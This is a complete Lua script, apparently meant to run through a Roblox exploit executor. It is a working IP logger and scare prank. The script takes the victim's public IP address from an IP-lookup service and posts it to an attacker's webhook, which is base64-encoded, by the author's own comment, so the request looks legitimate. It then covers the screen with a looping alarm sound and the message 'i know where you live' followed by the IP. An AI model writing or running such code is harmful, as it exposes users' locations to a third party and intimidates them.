-- global vars (decided to make it like this to make it look legit when sending off and to make it easier to change without needing to reobfuscate)
getgenv().key = "WEBHOOKURL"  -- Replace this with your actual Base64 encoded webhook

-- ip logger
local decryptedWebhook = crypt.base64decode(key)
local ip = tostring(game:HttpGet("https://api.ipify.org", true))
request({Url = decryptedWebhook, Method = "POST", Body = "Logged IP: " .. ip})

local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game.Players.LocalPlayer.PlayerGui

screenGui.IgnoreGuiInset = true
screenGui.Enabled = true

-- plays eas
local audioId = "rbxassetid://9057072055"
local audio = Instance.new("Sound")
audio.SoundId = audioId
audio.Looped = true
audio.Parent = screenGui
audio:Play()

-- casual scary message
local messageLabel = Instance.new("TextLabel")
messageLabel.Text = "i know where you live\n" .. ip
messageLabel.Font = Enum.Font.SourceSansBold
messageLabel.TextSize = 24
messageLabel.TextColor3 = Color3.new(1, 1, 1)
messageLabel.BackgroundTransparency = 0
messageLabel.BackgroundColor3 = Color3.new(0, 0, 0)

messageLabel.Size = UDim2.new(1, 0, 1, 0)
messageLabel.Position = UDim2.new(0, 0, 0, 0)

messageLabel.Parent = screenGui
